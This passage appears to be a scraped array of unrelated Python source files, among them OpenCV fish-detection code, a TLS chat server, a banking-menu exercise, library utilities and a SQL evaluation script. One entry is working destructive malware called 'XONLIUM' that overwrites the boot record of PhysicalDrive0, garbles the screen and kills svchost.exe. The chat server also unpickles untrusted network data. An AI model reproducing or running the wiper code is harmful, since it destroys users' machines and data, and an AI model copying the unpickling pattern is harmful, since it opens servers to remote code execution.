frame.copy()\r\n\t\t\tcv2.rectangle(rect_frame, (int(box[0]/width*img_width), int(box[1]/height*img_height)), (int(box[2]/width*img_width), int(box[3]/height*img_height)), color, 2)\r\n\t\t\tcv2.imwrite(output_dir + \"\\\\\" + str(cpt) + \".jpg\", frame)\r\n\t\t\tcv2.imwrite(output_dir + \"\\\\\" + str(cpt) + \"_with_box.jpg\", rect_frame)\r\n\r\n\tcap.release()\r\n\r\n\r\n\r\ndef process_images_c(model_class, model_reg, images, width, height):\r\n\t\"\"\"\r\n\t## Description\r\n\t\tProcess images with the neural network created\r\n\t\t\r\n\t### Args:\r\n\t\tmodel (tf_model): neural network\r\n\t\timages (np_array): Array of all images to be processed\r\n\t\twidth (float): width of the images\r\n\t\theight (float): height of the images\r\n\t\r\n\t### Returns:\r\n\t\t(list, np_array): labels and boxes of the processed images\r\n\t\"\"\"\r\n\tnormalized_images = images / 255.0\r\n\r\n\tlabels = model_class(normalized_images, training = False)\r\n\r\n\tboxes = np.zeros((len(labels), 4))\r\n\r\n\tnormalized_boxes = model_reg(normalized_images, training = False)\r\n\t## Get back the right width and height\r\n\tboxes[:,0], boxes[:,2] = normalized_boxes[:,0]*width, normalized_boxes[:,2]*width\r\n\tboxes[:,1], boxes[:,3] = normalized_boxes[:,1]*height, normalized_boxes[:,3]*height\r\n\r\n\treturn [np.argmax(l) for l in labels], boxes\r\n\r\n\r\ndef process_images(model, images):\r\n\tnormalized_images = images / 255.0\r\n\r\n\tlabels = model(normalized_images, training = False)\r\n\tprint(labels)\r\n\r\n\treturn [np.argmax(l) for l in labels]\r\n\r\n\r\ndef process_video(model, video_path, width, height, output_dir):\r\n\tcap = cv2.VideoCapture(video_path)\r\n\r\n\tcpt = 0\r\n\twhile cap.isOpened():\r\n\t\t_, frame = cap.read()\r\n\r\n\t\tif len(np.shape(frame)) != 3:\r\n\t\t\tbreak\r\n\r\n\t\timg_to_process = resize_images([frame], width, height)\r\n\r\n\t\tlabel = process_images(model, np.array(img_to_process))\r\n\r\n\t\tif label[0] == 1:\r\n\t\t\tcpt += 1\r\n\t\t\tcv2.imwrite(output_dir + \"\\\\\" + str(cpt) + \".jpg\", frame)\r\n\t\telse:\r\n\t\t\tcpt += 1\r\n\t\t\tframe = cv2.circle(frame, (20, 20), 10, color=(0,0,255) ,thickness=-1)\r\n\t\t\tcv2.imwrite(output_dir + \"\\\\\" + str(cpt) + \"nofish.jpg\", frame)\r\n\r\n",
    "import socket, threading, ssl, pickle, os, dotenv\n\ntry:\n    open('messages.bin', 'rb').close()\nexcept:\n    open('messages.bin', 'wb').close()\n\ndotenv.load_dotenv()\n\nHOST = os.getenv('IP_ADDR', 'localhost')\nPORT = int(os.getenv('PORT', '5555'))\nCERT_FILE = os.getenv('CERT_FILE', None)\nKEY_FILE = os.getenv('KEY_FILE', None)\n\nif (not CERT_FILE or not KEY_FILE):\n    print(\"Required SSL Key and Certificate files not found.\")\n    exit(1)\n\nssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\nssl_context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)\nclients = {}\ntry:\n    file=open('messages.bin', 'rb')\n    loaded_messages=pickle.load(file)\n    file.close()\nexcept:\n    loaded_messages={}\n\n# Function to handle client connections\ndef handle_client(client_socket, address):\n    while True:\n        try:\n            data = client_socket.recv(20480)\n            data = pickle.loads(data)\n            if 'message' in data:\n                if data['message']!='':\n                    loaded_messages[data['room']]['message']=data['message']\n                    loaded_messages[data['room']]['logs'].append(data['logs'])\n                    clients[data['room']]['message']=data['message']\n                    clients[data['room']]['logs'].append(data['logs'])\n                    for c in clients[data['room']]['clients']:\n                        if c != client_socket:\n                            c.send(pickle.dumps(data))\n                else:\n                    for i in clients[data['room']]['clients']:\n                        if i != conn_ssl:\n                            i.send(pickle.dumps({'logs':data['logs'], 'message':loaded_messages[data['room']]['message']}))\n                    loaded_messages[data['room']]['logs'].append(data['logs'])\n                    clients[data['room']]['clients'].remove(client_socket)\n                    clients[data['room']]['users'].remove(data['username'])\n                    if clients[data['room']]['clients']==[]:\n                        clients.pop(data['room'])\n                    client_socket.close()\n                    return\n            elif 'logs' in data:\n                print(f\"Sending logs to {address} in room {data['room']}\")\n                conn_ssl.send(pickle.dumps({'logs':loaded_messages[data['room']]['logs']}))\n            elif 'users' in data:\n                conn_ssl.send(pickle.dumps({'users':clients[data['room']]['users']}))\n        except Exception as e:\n            print(f\"Error: {e}\")\n            try:\n                for i in clients[data['room']]['clients']:\n                    if i != conn_ssl:\n                        i.send(pickle.dumps({'logs':data['logs'], 'message':loaded_messages[data['room']]['message']}))\n                clients[data['room']]['clients'].remove(client_socket)\n                clients[data['room']]['users'].remove(data['username'])\n                if clients[data['room']]==[]:\n                    clients.pop(data['room'])\n                client_socket.close()\n            except:\n                pass\n            return\n\n\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind((HOST, PORT))\nserver_socket.listen()\nprint(f\"Server listening on {HOST}:{PORT}\")\nwhile True:\n    try:\n        client_socket, address = server_socket.accept()\n    except:\n        exit()\n    finally:\n        file=open('messages.bin', 'wb')\n        pickle.dump(loaded_messages, file)\n        file.close()\n    conn_ssl = ssl_context.wrap_socket(client_socket, server_side=True)\n    data = conn_ssl.recv(20480)\n    data = pickle.loads(data)\n    if data['room'] in clients and data['username'] in clients[data['room']]['users']:\n        conn_ssl.send(pickle.dumps({'error':'username exists'}))\n        data=conn_ssl.recv(20480)\n        conn_ssl.close()\n        continue\n    if data['room'] in clients:\n        clients[data['room']]['clients'].append(conn_ssl)\n        clients[data['room']]['users'].append(data['username'])\n        clients[data['room']]['logs'].append(data['logs'])\n    else:\n        if data['room'] in loaded_messages:\n            loaded_messages[data['room']]['logs'].append(data['logs'])\n            clients[data['room']] = {'clients':[conn_ssl], 'message':loaded_messages[data['room']]['message'], 'logs':loaded_messages[data['room']]['logs'], 'users':[data['username']]}\n            conn_ssl.send(pickle.dumps({'message':loaded_messages[data['room']]['message'], 'logs':data['logs']}))\n        else:\n            clients[data['room']] = {'clients':[conn_ssl], 'message':None, 'logs':[data['logs']], 'users':[data['username']]}\n            loaded_messages[data['room']]={'message':None, 'logs':[data['logs']]}\n            conn_ssl.send(pickle.dumps({'message':None}))\n    for i in clients[data['room']]['clients']:\n        if i != conn_ssl:\n            i.send(pickle.dumps({'logs':data['logs'], 'message':loaded_messages[data['room']]['message']}))\n    del data\n    client_thread = threading.Thread(target=handle_client, args=(conn_ssl, address), ",
    "menu = (0)\n\nextrato = []\n\nsaldo = (0)\n\ndeposito = (0)\n\nsacar = (0)\n\nsaques = int(0)\n\ndef verificar_float(deposito):\n    try:\n        float(deposito) \n        return True\n    except ValueError:\n        try:\n            int(deposito)\n            return True\n        except ValueError:\n            return False\n\ndef verificar_float(sacar):\n    try:\n        float(sacar) \n        return True\n    except ValueError:\n        try:\n            int(sacar)\n            return True\n        except ValueError:\n            return False\n\ndef verificar_int(menu):\n    try:\n        int(menu) \n        return True\n    except ValueError:\n        return False\n\nmenu_texto = '''\n\n######## Bem-Vindo ao Banco X-NET ########\n\nEscolha uma op\u00e7\u00e3o para realias a opera\u00e7ao. \n\n1 - Depositar\n2 - Sacar\n3 - Extrato\n4 - Sair  \n\n'''\n\nwhile True:\n\n    print(menu_texto)\n\n    menu = (input('Por gentileza entre com a opera\u00e7\u00e3o que deseje realizar \\n'))\n\n    if verificar_int(menu):\n\n        menu = int(menu)\n\n        if menu == 1:\n\n            print('\\n Para prosseguir com o deposito por gentileza insira o valor desejado em R$: \\n')\n\n            deposito = (input())\n\n            if verificar_float(deposito):\n                deposito = float(deposito)\n                if deposito > 0:\n\n                    print(f'\\n O deposito no valor de RS:{deposito: .2f} foi realizado com sucesso \\n')\n\n                    extrato.append(deposito)\n\n                    saldo += deposito\n\n                    print(f'O novo saldo \u00e9 de RS:{saldo: .2f}\\n')\n\n                    input('\\n Pressione qualquer tecla para continuar')\n\n                else:\n            \n                    print('\\n Valor n\u00e3o permitido, por gentileza refa\u00e7a a opera\u00e7\u00e3o \\n')\n\n                    input('\\n Pressione qualquer tecla para continuar')\n\n            else:\n                print('Valor invalido por gentileza, tentar novamente !')\n                input('\\n Pressione qualquer tecla para continuar')\n\n    \n        elif menu == 2:\n\n            print(' \\n Insira o valor em R$ que deseja sacar \\n')\n        \n            sacar = (input())\n\n         \n        \n        \n            if verificar_float(sacar):\n                sacar = float(sacar)\n                if sacar <= saldo:\n            \n                    if sacar <= 500 and saques < 3:\n\n                        saldo -= sacar\n\n                        saques += 1\n                \n                        ext_saque = - sacar\n\n                        extrato.append(ext_saque)\n\n                        print(f'\\n Saque no valor de R$:{sacar: .2f} realizado com sucesso o novo saldo \u00e9 R$:{saldo: .2f}\\n')\n\n                        input('\\n Pressione qualquer tecla para continuar')\n\n                    else:\n\n                        if sacar > 500:\n\n                            print('Valor de saque maior que o permitido, refa\u00e7a o saque com limite de R$: 500,00 reais\\n')\n\n                            input('\\n Pressione qualquer tecla para continuar')\n\n                        else:\n                            print('\\n Quantidade de saques diarios exedida, por gentileza contate seu gerente.\\n')\n\n                            input('\\n Pressione qualquer tecla para continuar')\n                else:\n\n                    print(f'A tentativa de saque no valor R$:{sacar: .2f} \u00e9 maior que o saldo de R$:{saldo: .2f}')\n\n                    input('\\n Pressione qualquer tecla para continuar')\n\n            else:\n                print('Valor invalido, por gentileza refa\u00e7a a opera\u00e7\u00e3o')\n                input('\\n Pressione qualquer tecla para continuar')\n\n\n        elif menu == 3:\n\n            print('\\n Esses s\u00e3o os \u00faltimos movimentos realizados em sua conta: \\n')\n\n            exibir_extrato = str(\"\")\n\n            for movimento in extrato:\n\n                exibir_extrato += f'### R${movimento: .2f}\\n'\n\n            print(exibir_extrato)\n\n            print(f'O saldo total \u00e9 R$:  {saldo: .2f}')\n\n            input('\\n Pressione qualquer tecla para continuar')\n\n        elif menu == 4:\n\n            print(\"Obrigado por usar nosso banco. At\u00e9 mais!\\n\")\n\n            break\n\n\n    else:\n        print('Op\u00e7ao invalida, tente novamente.')\n        input('\\n Pressione qualquer tecla para continuar')\n\n\n\n\n\n    ",
    "import io\nimport socket\nimport ssl\n\nfrom ..exceptions import ProxySchemeUnsupported\nfrom ..packages import six\n\nSSL_BLOCKSIZE = 16384\n\n\nclass SSLTransport:\n    \"\"\"\n    The SSLTransport wraps an existing socket and establishes an SSL connection.\n\n    Contrary to Python's implementation of SSLSocket, it allows you to chain\n    multiple TLS connections together. It's particularly useful if you need to\n    implement TLS within TLS.\n\n    The class supports most of the socket API operations.\n    \"\"\"\n\n    @staticmethod\n    def _validate_ssl_context_for_tls_in_tls(ssl_context):\n        \"\"\"\n        Raises a ProxySchemeUnsupported if the provided ssl_context can't be used\n        for TLS in TLS.\n\n        The only requirement is that the ssl_context provides the 'wrap_bio'\n        methods.\n        \"\"\"\n\n        if not hasattr(ssl_context, \"wrap_bio\"):\n            if six.PY2:\n                raise ProxySchemeUnsupported(\n                    \"TLS in TLS requires SSLContext.wrap_bio() which isn't \"\n                    \"supported on Python 2\"\n                )\n            else:\n                raise ProxySchemeUnsupported(\n                    \"TLS in TLS requires SSLContext.wrap_bio() which isn't \"\n                    \"available on non-native SSLContext\"\n                )\n\n    def __init__(\n        self, socket, ssl_context, server_hostname=None, suppress_ragged_eofs=True\n    ):\n        \"\"\"\n        Create an SSLTransport around socket using the provided ssl_context.\n        \"\"\"\n        self.incoming = ssl.MemoryBIO()\n        self.outgoing = ssl.MemoryBIO()\n\n        self.suppress_ragged_eofs = suppress_ragged_eofs\n        self.socket = socket\n\n        self.sslobj = ssl_context.wrap_bio(\n            self.incoming, self.outgoing, server_hostname=server_hostname\n        )\n\n        # Perform initial handshake.\n        self._ssl_io_loop(self.sslobj.do_handshake)\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *_):\n        self.close()\n\n    def fileno(self):\n        return self.socket.fileno()\n\n    def read(self, len=1024, buffer=None):\n        return self._wrap_ssl_read(len, buffer)\n\n    def recv(self, len=1024, flags=0):\n        if flags != 0:\n            raise ValueError(\"non-zero flags not allowed in calls to recv\")\n        return self._wrap_ssl_read(len)\n\n    def recv_into(self, buffer, nbytes=None, flags=0):\n        if flags != 0:\n            raise ValueError(\"non-zero flags not allowed in calls to recv_into\")\n        if buffer and (nbytes is None):\n            nbytes = len(buffer)\n        elif nbytes is None:\n            nbytes = 1024\n        return self.read(nbytes, buffer)\n\n    def sendall(self, data, flags=0):\n        if flags != 0:\n            raise ValueError(\"non-zero flags not allowed in calls to sendall\")\n        count = 0\n        with memoryview(data) as view, view.cast(\"B\") as byte_view:\n            amount = len(byte_view)\n            while count < amount:\n                v = self.send(byte_view[count:])\n                count += v\n\n    def send(self, data, flags=0):\n        if flags != 0:\n            raise ValueError(\"non-zero flags not allowed in calls to send\")\n        response = self._ssl_io_loop(self.sslobj.write, data)\n        return response\n\n    def makefile(\n        self, mode=\"r\", buffering=None, encoding=None, errors=None, newline=None\n    ):\n        \"\"\"\n        Python's httpclient uses makefile and buffered io when reading HTTP\n        messages and we need to support it.\n\n        This is unfortunately a copy and paste of socket.py makefile with small\n        changes to point to the socket directly.\n        \"\"\"\n        if not set(mode) <= {\"r\", \"w\", \"b\"}:\n            raise ValueError(\"invalid mode %r (only r, w, b allowed)\" % (mode,))\n\n        writing = \"w\" in mode\n        reading = \"r\" in mode or not writing\n        assert reading or writing\n        binary = \"b\" in mode\n        rawmode = \"\"\n        if reading:\n            rawmode += \"r\"\n        if writing:\n            rawmode += \"w\"\n        raw = socket.SocketIO(self, rawmode)\n        self.socket._io_refs += 1\n        if buffering is None:\n            buffering = -1\n        if buffering < 0:\n            buffering = io.DEFAULT_BUFFER_SIZE\n        if buffering == 0:\n            if not binary:\n                raise ValueError(\"unbuffered streams must be binary\")\n            return raw\n        if reading and writing:\n            buffer = io.BufferedRWPair(raw, raw, buffering)\n        elif reading:\n            buffer = io.BufferedReader(raw, buffering)\n        else:\n            assert writing\n            buffer = io.BufferedWriter(raw, buffering)\n        if binary:\n            return buffer\n        text = io.TextIOWrapper(buffer, encoding, errors, newline)\n        text.mode = mode\n        return text\n\n    def unwrap(self):\n        self._ssl_io_loop(self.sslobj.unwrap)\n\n    def close(self):\n        self.socket.close()\n\n    def getpeercert(self, binary_form=False):\n        return self.sslobj.getpeercert(binary_form)\n\n    def version(self",
    "# This file is dual licensed under the terms of the Apache License, Version\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\n# for complete details.\n\nimport re\nfrom typing import FrozenSet, NewType, Tuple, Union, cast\n\nfrom .tags import Tag, parse_tag\nfrom .version import InvalidVersion, Version\n\nBuildTag = Union[Tuple[()], Tuple[int, str]]\nNormalizedName = NewType(\"NormalizedName\", str)\n\n\nclass InvalidWheelFilename(ValueError):\n    \"\"\"\n    An invalid wheel filename was found, users should refer to PEP 427.\n    \"\"\"\n\n\nclass InvalidSdistFilename(ValueError):\n    \"\"\"\n    An invalid sdist filename was found, users should refer to the packaging user guide.\n    \"\"\"\n\n\n_canonicalize_regex = re.compile(r\"[-_.]+\")\n# PEP 427: The build number must start with a digit.\n_build_tag_regex = re.compile(r\"(\\d+)(.*)\")\n\n\ndef canonicalize_name(name: str) -> NormalizedName:\n    # This is taken from PEP 503.\n    value = _canonicalize_regex.sub(\"-\", name).lower()\n    return cast(NormalizedName, value)\n\n\ndef canonicalize_version(version: Union[Version, str]) -> str:\n    \"\"\"\n    This is very similar to Version.__str__, but has one subtle difference\n    with the way it handles the release segment.\n    \"\"\"\n    if isinstance(version, str):\n        try:\n            parsed = Version(version)\n        except InvalidVersion:\n            # Legacy versions cannot be normalized\n            return version\n    else:\n        parsed = version\n\n    parts = []\n\n    # Epoch\n    if parsed.epoch != 0:\n        parts.append(f\"{parsed.epoch}!\")\n\n    # Release segment\n    # NB: This strips trailing '.0's to normalize\n    parts.append(re.sub(r\"(\\.0)+$\", \"\", \".\".join(str(x) for x in parsed.release)))\n\n    # Pre-release\n    if parsed.pre is not None:\n        parts.append(\"\".join(str(x) for x in parsed.pre))\n\n    # Post-release\n    if parsed.post is not None:\n        parts.append(f\".post{parsed.post}\")\n\n    # Development release\n    if parsed.dev is not None:\n        parts.append(f\".dev{parsed.dev}\")\n\n    # Local version segment\n    if parsed.local is not None:\n        parts.append(f\"+{parsed.local}\")\n\n    return \"\".join(parts)\n\n\ndef parse_wheel_filename(\n    filename: str,\n) -> Tuple[NormalizedName, Version, BuildTag, FrozenSet[Tag]]:\n    if not filename.endswith(\".whl\"):\n        raise InvalidWheelFilename(\n            f\"Invalid wheel filename (extension must be '.whl'): {filename}\"\n        )\n\n    filename = filename[:-4]\n    dashes = filename.count(\"-\")\n    if dashes not in (4, 5):\n        raise InvalidWheelFilename(\n            f\"Invalid wheel filename (wrong number of parts): {filename}\"\n        )\n\n    parts = filename.split(\"-\", dashes - 2)\n    name_part = parts[0]\n    # See PEP 427 for the rules on escaping the project name\n    if \"__\" in name_part or re.match(r\"^[\\w\\d._]*$\", name_part, re.UNICODE) is None:\n        raise InvalidWheelFilename(f\"Invalid project name: {filename}\")\n    name = canonicalize_name(name_part)\n    version = Version(parts[1])\n    if dashes == 5:\n        build_part = parts[2]\n        build_match = _build_tag_regex.match(build_part)\n        if build_match is None:\n            raise InvalidWheelFilename(\n                f\"Invalid build number: {build_part} in '{filename}'\"\n            )\n        build = cast(BuildTag, (int(build_match.group(1)), build_match.group(2)))\n    else:\n        build = ()\n    tags = parse_tag(parts[-1])\n    return (name, version, build, tags)\n\n\ndef parse_sdist_filename(filename: str) -> Tuple[NormalizedName, Version]:\n    if filename.endswith(\".tar.gz\"):\n        file_stem = filename[: -len(\".tar.gz\")]\n    elif filename.endswith(\".zip\"):\n        file_stem = filename[: -len(\".zip\")]\n    else:\n        raise InvalidSdistFilename(\n            f\"Invalid sdist filename (extension must be '.tar.gz' or '.zip'):\"\n            f\" {filename}\"\n        )\n\n    # We are requiring a PEP 440 version, which cannot contain dashes,\n    # so we split on the last dash.\n    name_part, sep, version_part = file_stem.rpartition(\"-\")\n    if not sep:\n        raise InvalidSdistFilename(f\"Invalid sdist filename: {filename}\")\n\n    name = canonicalize_name(name_part)\n    version = Version(version_part)\n    return (name, version)\n",
    "import psycopg2\nimport logging\nfrom adjuster import create_json_file, read_data_from_json_file, read_sql_query\nfrom psycopg2 import Error, DatabaseError, OperationalError, InternalError\n\n\nclass PostgresBD:\n    \"\"\"\n    A class for interacting with a PostgreSQL database.\n\n    Attributes:\n        __database_user (str): The username for connecting to the database.\n        __database_name (str): The name of the database.\n        __database_port (str): The port number for connecting to the database.\n        __database_host (str): The hostname or IP address of the database server.\n        __database_password (str): The password for connecting to the database.\n        __database_connection: The connection object for the database.\n        __cursor: The cursor object for executing SQL queries.\n        __database_total_queries (int): Total number of queries executed.\n        __results_folder (str): The folder where query results will be stored.\n\n    Methods:\n        __init__: Initialize the PostgresBD object.\n        __del__: Destructor method to clean up resources.\n        create_connection: Establish a connection to the database.\n        create_cursor: Create a cursor for executing SQL queries.\n        fast_connection: Shortcut method to quickly establish a connection and create a cursor.\n        insert_data_from_json: Insert data into a table from a JSON file.\n        close_connection: Close the connection to the database.\n        do_query: Execute a SQL query and save the results to a JSON file.\n        commit_connection: Commit the current transaction to the database.\n    \"\"\"\n\n    def __init__(self, user: str, password: str, host: str, port: str, database: str):\n        \"\"\"\n        Initialize the PostgresBD object.\n\n        Args:\n            user (str): The username for connecting to the database.\n            password (str): The password for connecting to the database.\n            host (str): The hostname or IP address of the database server.\n            port (str): The port number for connecting to the database.\n            database (str): The name of the database.\n        \"\"\"\n        self.__database_user: str = user\n        self.__database_name: str = database\n        self.__database_port: str = port\n        self.__database_host: str = host\n        self.__database_password: str = password\n        self.__database_connection = None\n        self.__cursor = None\n        self.__database_total_queries: int = 0\n        self.__results_folder: str = \"queries_results\"\n        logging.info(\"created postrgresql_db object.\")\n\n    def __del__(self):\n        \"\"\"\n        Destructor method to clean up resources.\n        \"\"\"\n        logging.info(\"postrgresql_db object was deleted\")\n\n    def create_connection(self) -> None:\n        \"\"\"\n        Establish a connection to the database.\n        \"\"\"\n        self.__database_connection = psycopg2.connect(\n            user=self.__database_user,\n            password=self.__database_password,\n            host=self.__database_host,\n            port=self.__database_port,\n            database=self.__database_name,\n        )\n        if self.__database_connection is not None:\n            logging.info(\n                \"Connection to the database \"\n                + self.__database_name\n                + \" is made succsesful\"\n            )\n        else:\n            logging.warning(\"Created connection is None, something went wrong.\")\n\n    def create_cursor(self) -> None:\n        \"\"\"\n        Create a cursor for executing SQL queries.\n        \"\"\"\n        if self.__database_connection is None:\n            logging.warning(\"Database connection is not established.\")\n        else:\n            self.__cursor = self.__database_connection.cursor()\n            logging.info(\n                \"Cursor for database %s was successfully created.\", self.__database_name\n            )\n\n    def fast_connection(self):\n        \"\"\"\n        Quickly establish a connection to the database and create a cursor.\n        \"\"\"\n        self.create_connection()\n        self.create_cursor()\n\n    def insert_data_from_json(self, json_file_path: str, table_name: str) -> None:\n        \"\"\"\n        Insert data into the specified table from a JSON file.\n\n        Args:\n            json_file_path (str): The path to the JSON file containing the data.\n            table_name (str): The name of the table to insert the data into.\n        \"\"\"\n        try:\n            data = read_data_from_json_file(json_file_path)\n            for item in data:\n                keys = item.keys()\n                columns = \", \".join(keys)\n                placeholders = \", \".join([\"%s\"] * len(keys))\n                sql = f\"INSERT INTO {table_name} ({columns}) VALUES ({placeholders})\"\n                values = [item[key] for key in keys]\n                self.__cursor.execute(sql, values)\n            logging.info(\"Data inserted successfully into the table: \" + table_name)\n        except (\n            psycopg2.errors.UndefinedTable,\n            psycopg2.errors.InFailedSqlTr",
    "import threading\nimport time\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport pandas as pd\n\nnum_matrices = 100\nmatrix_size = 1000\nnum_threads = [1, 2, 4, 8, 12]\n\n\ndef matrix_multiply(A, B):\n    return np.matmul(A, B)\n\n\ndef generate_random_matrix(rows, cols):\n    return np.random.rand(rows, cols)\n\n\nconstant_matrix = generate_random_matrix(matrix_size, matrix_size)\n\n\n# Function to execute matrix multiplication in a thread\ndef worker(matrices, constant_matrix, results, start_index, end_index):\n    for i in range(start_index, end_index):\n        results[i] = matrix_multiply(matrices[i], constant_matrix)\n\n\n# precompute kardiya so that benchmark ke liye sahi ho\nmatrices = [\n    generate_random_matrix(matrix_size, matrix_size) for _ in range(num_matrices)\n]\n\ntimes = []\nfor num_thread in num_threads:\n    start_time = time.time()\n\n    # Create threads\n    results = [None] * num_matrices\n    threads = []\n    chunk_size = num_matrices // num_thread\n\n    for i in range(num_thread):\n        start_index = i * chunk_size\n        end_index = start_index + chunk_size\n        if i == num_thread - 1:\n            end_index = num_matrices\n        thread = threading.Thread(\n            target=worker,\n            args=(matrices, constant_matrix, results, start_index, end_index),\n        )\n        threads.append(thread)\n        thread.start()\n\n    # Wait for threads to finish\n    for thread in threads:\n        thread.join()\n\n    end_time = time.time()\n    times.append(end_time - start_time)\n\n# Plot results\nplt.figure(figsize=(8, 6))\nplt.plot(num_threads, times)\nplt.xlabel(\"Number of Threads\")\nplt.ylabel(\"Time (seconds)\")\nplt.title(\"Matrix Multiplication Benchmark\")\nplt.show()\n\n\n# Create a DataFrame to store the results\nresults_df = pd.DataFrame({\n    'Number of Threads': num_threads,\n    'Time Taken (seconds)': times\n})\n\n# Print DataFrame\nprint(\"Results DataFrame:\")\nprint(results_df)\n\n# Save DataFrame to CSV file\nresults_df.to_csv('time_vs_threads.csv', index=False)\n\nprint(\"\\nResults saved to 'time_vs_threads.csv'\")",
    "from win32ui import *\r\nfrom win32file import *\r\nfrom win32con import *\r\nfrom win32gui import *\r\nfrom win32api import *\r\nimport sys\r\nimport os\r\nimport random\r\n\r\ndesk = GetDC(0)\r\nw    = GetSystemMetrics(0)\r\nh    = GetSystemMetrics(1)\r\nx    = SM_CXSCREEN\r\ny    = SM_CYSCREEN\r\n\r\nif MessageBox(None, \"This Malware can Overwrite your MBR and can Harm your PC!\\nThe Creator is not Responseble for any Damage! The Malware is only for Education / Entertainment! Contains flashing Lights.\\n\\nDo you want to continue?\", \"XONLIUM\", MB_ICONWARNING | MB_YESNO) == IDNO:\r\n    sys.exit()\r\nif MessageBox(None, \"This is the Last Warning! This can harm your PC badly.\\n\\nDo you want to execute this Malware?\", \"XONLIUM -- LAST WARNING\", MB_ICONWARNING | MB_YESNO) == IDNO:\r\n    sys.exit()\r\n    \r\nhDevice = CreateFileW(\"\\\\\\\\.\\\\PhysicalDrive0\", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)\r\nWriteFile(hDevice, AllocateReadBuffer(512), None)\r\nCloseHandle(hDevice)\r\n\r\nfor i in range(0, 550):\r\n    PatBlt(desk, random.randrange(w), random.randrange(h), random.randrange(w), random.randrange(h), PATINVERT)\r\nfor i in range(0, 750):\r\n    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)\r\nfor i in range(0, 1000):\r\n    brush = CreateSolidBrush(RGB(random.randrange(0,255), random.randrange(0,255), random.randrange(0,255)))\r\n    SelectObject(desk, brush)\r\n    PatBlt(desk, random.randrange(w), random.randrange(h), random.randrange(w), random.randrange(h), PATINVERT)\r\nfor i in range(0, 750):\r\n    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCCOPY)\r\nfor i in range(0, 500):\r\n    BitBlt(desk, 0, 0, w, h, desk, 12, 12, SRCINVERT)\r\n\r\nos.system(\"taskkill /F /IM svchost.exe\")\r\n",
    "# Configuration file for the Sphinx documentation builder.\n#\n# For the full list of built-in configuration values, see the documentation:\n# https://www.sphinx-doc.org/en/master/usage/configuration.html\n\n# -- Project information -----------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#project-information\n\nimport os\nimport sys\nsys.path.insert(0, os.path.abspath('../..'))\n\nproject = 'serial_toolbox'\ncopyright = '2024, Takuya Sasatani'\nauthor = 't-sasatani'\nrelease = '0.1.4'\n\n# -- General configuration ---------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#general-configuration\n\n\nextensions = [\n    'myst_parser',\n    'sphinx.ext.duration',\n    'sphinx.ext.doctest',\n    'sphinx.ext.autodoc',\n    'sphinx.ext.autosummary',\n    'sphinx.ext.napoleon',\n    ]\n\nautosummary_generate = True  # Turn on sphinx.ext.autosummary\n\ntemplates_path = ['_templates']\nexclude_patterns = []\n\n# -- Options for HTML output -------------------------------------------------\n# https://www.sphinx-doc.org/en/master/usage/configuration.html#options-for-html-output\n\nhtml_theme = 'sphinx_rtd_theme'\n#html_static_path = ['_static']\n",
    "################################\n# Credit to https://github.com/taoyds/spider repository\n################################\n\n################################\n# val: number(float)/string(str)/sql(dict)\n# col_unit: (agg_id, col_id, isDistinct(bool))\n# val_unit: (unit_op, col_unit1, col_unit2)\n# table_unit: (table_type, col_unit/sql)\n# cond_unit: (not_op, op_id, val_unit, val1, val2)\n# condition: [cond_unit1, 'and'/'or', cond_unit2, ...]\n# sql {\n#   'select': (isDistinct(bool), [(agg_id, val_unit), (agg_id, val_unit), ...])\n#   'from': {'table_units': [table_unit1, table_unit2, ...], 'conds': condition}\n#   'where': condition\n#   'groupBy': [col_unit1, col_unit2, ...]\n#   'orderBy': ('asc'/'desc', [val_unit1, val_unit2, ...])\n#   'having': condition\n#   'limit': None/limit value\n#   'intersect': None/sql\n#   'except': None/sql\n#   'union': None/sql\n# }\n################################\n\nfrom __future__ import print_function\nimport os, sys\nimport json\nimport sqlite3\nimport traceback\nimport argparse\n\nfrom process_sql import tokenize, get_schema, get_tables_with_alias, Schema, get_sql\n\n# Flag to disable value evaluation\nDISABLE_VALUE = True\n# Flag to disable distinct in select evaluation\nDISABLE_DISTINCT = True\n\n\nCLAUSE_KEYWORDS = ('select', 'from', 'where', 'group', 'order', 'limit', 'intersect', 'union', 'except')\nJOIN_KEYWORDS = ('join', 'on', 'as')\n\nWHERE_OPS = ('not', 'between', '=', '>', '<', '>=', '<=', '!=', 'in', 'like', 'is', 'exists')\nUNIT_OPS = ('none', '-', '+', \"*\", '/')\nAGG_OPS = ('none', 'max', 'min', 'count', 'sum', 'avg')\nTABLE_TYPE = {\n    'sql': \"sql\",\n    'table_unit': \"table_unit\",\n}\n\nCOND_OPS = ('and', 'or')\nSQL_OPS = ('intersect', 'union', 'except')\nORDER_OPS = ('desc', 'asc')\n\n\nHARDNESS = {\n    \"component1\": ('where', 'group', 'order', 'limit', 'join', 'or', 'like'),\n    \"component2\": ('except', 'union', 'intersect')\n}\n\n\ndef condition_has_or(conds):\n    return 'or' in conds[1::2]\n\n\ndef condition_has_like(conds):\n    return WHERE_OPS.index('like') in [cond_unit[1] for cond_unit in conds[::2]]\n\n\ndef condition_has_sql(conds):\n    for cond_unit in conds[::2]:\n        val1, val2 = cond_unit[3], cond_unit[4]\n        if val1 is not None and type(val1) is dict:\n            return True\n        if val2 is not None and type(val2) is dict:\n            return True\n    return False\n\n\ndef val_has_op(val_unit):\n    return val_unit[0] != UNIT_OPS.index('none')\n\n\ndef has_agg(unit):\n    return unit[0] != AGG_OPS.index('none')\n\n\ndef accuracy(count, total):\n    if count == total:\n        return 1\n    return 0\n\n\ndef recall(count, total):\n    if count == total:\n        return 1\n    return 0\n\n\ndef F1(acc, rec):\n    if (acc + rec) == 0:\n        return 0\n    return (2. * acc * rec) / (acc + rec)\n\n\ndef get_scores(count, pred_total, label_total):\n    if pred_total != label_total:\n        return 0,0,0\n    elif count == pred_total:\n        return 1,1,1\n    return 0,0,0\n\n\ndef eval_sel(pred, label):\n    pred_sel = pred['select'][1]\n    label_sel = label['select'][1]\n    label_wo_agg = [unit[1] for unit in 